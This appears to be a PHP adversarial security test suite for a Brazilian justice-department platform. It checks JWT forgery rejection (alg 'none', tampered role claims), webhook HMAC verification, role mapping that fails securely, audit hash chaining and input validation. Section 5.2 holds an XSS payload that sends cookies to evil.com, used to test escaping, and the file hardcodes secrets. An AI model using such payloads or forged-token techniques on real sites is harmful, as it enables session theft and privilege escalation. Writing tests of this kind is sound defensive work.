<?php

require_once __DIR__ . '/../../app/Services/LgpdSecurityService.php';
require_once __DIR__ . '/../../app/Services/AuditService.php';
require_once __DIR__ . '/../../app/Services/WebRtcJwtService.php';
require_once __DIR__ . '/../../app/Services/GovBrAuthService.php';

use App\Services\LgpdSecurityService;
use App\Services\AuditService;
use App\Services\WebRtcJwtService;
use App\Services\GovBrAuthService;

echo "=== REVIEWER 2 ADVERSARIAL STRESS TEST SUITE ===" . PHP_EOL;

$passCount = 0;
$failCount = 0;

function report(bool $condition, string $testName): void {
    global $passCount, $failCount;
    if ($condition) {
        $passCount++;
        echo "  [PASS] {$testName}" . PHP_EOL;
    } else {
        $failCount++;
        echo "  [FAIL] {$testName}" . PHP_EOL;
    }
}

$jwtSecret = 'sejus_jwt_shared_secret_2026';
$jwtService = new WebRtcJwtService($jwtSecret, 3600);

// 1. JWT Security Attacks
echo PHP_EOL . "1. WebRTC JWT Security Attacks:" . PHP_EOL;

// 1.1 Alg 'none' attack
$h_none = $jwtService->base64UrlEncode(json_encode(['alg' => 'none', 'typ' => 'JWT']));
$p = $jwtService->base64UrlEncode(json_encode(['sub' => 1, 'role' => 'gestor', 'exp' => time() + 3600]));
$fakeNoneJwt = $h_none . '.' . $p . '.';
$resNone = $jwtService->verifyJwt($fakeNoneJwt);
report($resNone['valid'] === false, 'Alg "none" attack is rejected');

// 1.2 Tampered payload with valid original signature
$tokenData = $jwtService->encodeJwt(['alg' => 'HS256', 'typ' => 'JWT'], ['sub' => 1, 'role' => 'egresso', 'exp' => time() + 3600], $jwtSecret);
$parts = explode('.', $tokenData);
$tamperedPayload = $jwtService->base64UrlEncode(json_encode(['sub' => 1, 'role' => 'gestor', 'exp' => time() + 3600]));
$tamperedJwt = $parts[0] . '.' . $tamperedPayload . '.' . $parts[2];
$resTampered = $jwtService->verifyJwt($tamperedJwt);
report($resTampered['valid'] === false, 'Tampered role payload claim is rejected');

// 1.3 Signature truncation
$truncatedJwt = substr($tokenData, 0, -5);
$resTruncated = $jwtService->verifyJwt($truncatedJwt);
report($resTruncated['valid'] === false, 'Truncated signature is rejected');

// 1.4 Expired token
$expiredPayload = ['sub' => 1, 'role' => 'tecnico', 'exp' => time() - 100, 'iat' => time() - 3700];
$expiredJwt = $jwtService->encodeJwt(['alg' => 'HS256', 'typ' => 'JWT'], $expiredPayload, $jwtSecret);
$resExpired = $jwtService->verifyJwt($expiredJwt);
report($resExpired['valid'] === false && $resExpired['error'] === 'TOKEN_EXPIRED', 'Expired token is rejected with TOKEN_EXPIRED');

// 1.5 Future nbf token
$futurePayload = ['sub' => 1, 'role' => 'tecnico', 'nbf' => time() + 300, 'exp' => time() + 3600];
$futureJwt = $jwtService->encodeJwt(['alg' => 'HS256', 'typ' => 'JWT'], $futurePayload, $jwtSecret);
$resFuture = $jwtService->verifyJwt($futureJwt);
report($resFuture['valid'] === false && $resFuture['error'] === 'TOKEN_NOT_YET_VALID', 'Future nbf token is rejected with TOKEN_NOT_YET_VALID');

// 1.6 Malformed JWT (2 parts, 4 parts, empty)
report($jwtService->verifyJwt('header.payload')['valid'] === false, '2-part token is rejected');
report($jwtService->verifyJwt('header.payload.sig.extra')['valid'] === false, '4-part token is rejected');
report($jwtService->verifyJwt('')['valid'] === false, 'Empty token is rejected');

// 2. Webhook HMAC-SHA256 Signature Verification Attacks
echo PHP_EOL . "2. WebRTC Webhook HMAC Verification Attacks:" . PHP_EOL;

$webhookSecret = 'sejus_webrtc_webhook_secret_2026';
$rawBody = json_encode([
    'event' => 'session.ended',
    'room_id' => 'sala-vit-101',
    'data' => [
        'duration_seconds' => 900,
        'summary_telemetry' => ['avg_mos' => 4.2],
    ],
]);
$validSig = hash_hmac('sha256', $rawBody, $webhookSecret);
$tamperedBody = $rawBody . ' ';
$tamperedSig = hash_hmac('sha256', $tamperedBody, $webhookSecret);

report(hash_equals($validSig, hash_hmac('sha256', $rawBody, $webhookSecret)), 'Genuine raw payload signature verifies with hash_equals');
report(!hash_equals($validSig, $tamperedSig), '1-byte modified payload fails HMAC verification');
report(!hash_equals($validSig, hash_hmac('sha256', $rawBody, 'wrong_secret')), 'Wrong secret key fails HMAC verification');

// 3. GovBrAuthService Role Resolution Security
echo PHP_EOL . "3. GovBrAuthService OIDC Claim & Fail-Secure Tests:" . PHP_EOL;
$lgpd = new LgpdSecurityService('conecta_egresso_lgpd_pepper_2026_sejus_es');
$audit = new AuditService();
$govBr = new GovBrAuthService($lgpd, $audit);

// 3.1 Attempt privilege escalation with Bronze trust level to Gestor
$fakeGestorBronze = [
    'sub' => 'attacker_01',
    'cpf' => '529.982.247-25',
    'name' => 'Fake Gestor',
    'nivel_confianca' => 'Bronze', // Only Bronze!
    'orgao' => 'SEJUS',
    'cargo' => 'Gestor',
];
$resolvedRole = $govBr->mapClaimsToRole($fakeGestorBronze);
report($resolvedRole === 'egresso', 'Gestor role denied for non-Ouro trust level (defaults to egresso)');

// 3.2 Attempt privilege escalation with unknown external org
$fakeGestorOtherOrg = [
    'sub' => 'attacker_02',
    'cpf' => '529.982.247-25',
    'name' => 'Foreign Server',
    'nivel_confianca' => 'Ouro',
    'orgao' => 'OUTRO_ORGAO',
    'cargo' => 'Diretor',
];
report($govBr->mapClaimsToRole($fakeGestorOtherOrg) === 'egresso', 'External org claims fail-securely default to egresso');

// 3.3 Valid Gestor with Ouro trust + SEJUS
$validGestor = [
    'sub' => 'gestor_01',
    'cpf' => '529.982.247-25',
    'name' => 'Gestor Titular',
    'nivel_confianca' => 'Ouro',
    'orgao' => 'SEJUS',
    'cargo' => 'Gestor de Políticas Penais',
];
report($govBr->mapClaimsToRole($validGestor) === 'gestor', 'Legitimate Ouro + SEJUS maps to gestor');

// 4. Audit Trail Cryptographic Hash Chaining Integrity
echo PHP_EOL . "4. Audit Hash Chaining Integrity & Tamper Detection:" . PHP_EOL;

$h0 = AuditService::GENESIS_HASH;
$h1 = $audit->calculateRecordHash($h0, 101, 14, 'VIEW_PRONTUARIO', '192.168.1.1', '2026-08-17T14:00:00Z', ['filter' => 'all']);
$h2 = $audit->calculateRecordHash($h1, 101, 14, 'ADD_TIMELINE_EVENT', '192.168.1.1', '2026-08-17T14:05:00Z', ['event' => 'acolhimento_video']);

// Verify deterministic calculation
$h1_recalc = $audit->calculateRecordHash($h0, 101, 14, 'VIEW_PRONTUARIO', '192.168.1.1', '2026-08-17T14:00:00Z', ['filter' => 'all']);
report(hash_equals($h1, $h1_recalc), 'Audit block hash calculation is strictly deterministic');

// Tamper detection in previous block
$h1_tampered = $audit->calculateRecordHash($h0, 101, 14, 'VIEW_PRONTUARIO', '192.168.1.1', '2026-08-17T14:00:00Z', ['filter' => 'TAMPERED']);
$h2_from_tampered = $audit->calculateRecordHash($h1_tampered, 101, 14, 'ADD_TIMELINE_EVENT', '192.168.1.1', '2026-08-17T14:05:00Z', ['event' => 'acolhimento_video']);
report(!hash_equals($h2, $h2_from_tampered), 'Tampering any antecedent field invalidates downstream block hash');

// 5. Input Validation Boundaries
echo PHP_EOL . "5. Input Validation Boundaries & Escaping:" . PHP_EOL;

// 5.1 64KB Payload Limit
$smallPayload = str_repeat('A', 1024);
$largePayload = str_repeat('A', 70000);
report(strlen($smallPayload) <= 65536, '1KB payload is within 64KB limit');
report(strlen($largePayload) > 65536, '70KB payload correctly exceeds 64KB limit');

// 5.2 XSS Sanitization
$xssVector = '<script>document.location="http://evil.com/?cookie="+document.cookie</script>';
$escapedVector = htmlspecialchars($xssVector, ENT_QUOTES, 'UTF-8');
report(!str_contains($escapedVector, '<script>'), 'XSS script tags are escaped to &lt;script&gt;');
report(str_contains($escapedVector, '&quot;'), 'Quotes are escaped to &quot;');

// 5.3 IBGE Code Validation
$validEsIbge = '3205309'; // Vitória
$validLinharesIbge = '3203205'; // Linhares
$invalidRjIbge = '3304557'; // Rio de Janeiro
$invalidSpIbge = '3550308'; // São Paulo
$shortIbge = '32053';

report(str_starts_with($validEsIbge, '32') && strlen($validEsIbge) === 7, 'Vitória ES IBGE is valid');
report(str_starts_with($validLinharesIbge, '32') && strlen($validLinharesIbge) === 7, 'Linhares ES IBGE is valid');
report(!str_starts_with($invalidRjIbge, '32'), 'RJ IBGE code is rejected');
report(!str_starts_with($invalidSpIbge, '32'), 'SP IBGE code is rejected');
report(strlen($shortIbge) !== 7, 'Short IBGE code is rejected');

echo PHP_EOL . "=================================================" . PHP_EOL;
echo "ADVERSARIAL SUITE SUMMARY: {$passCount} Passed | {$failCount} Failed" . PHP_EOL;
echo "=================================================" . PHP_EOL;

if ($failCount > 0) {
    exit(1);
}
exit(0);
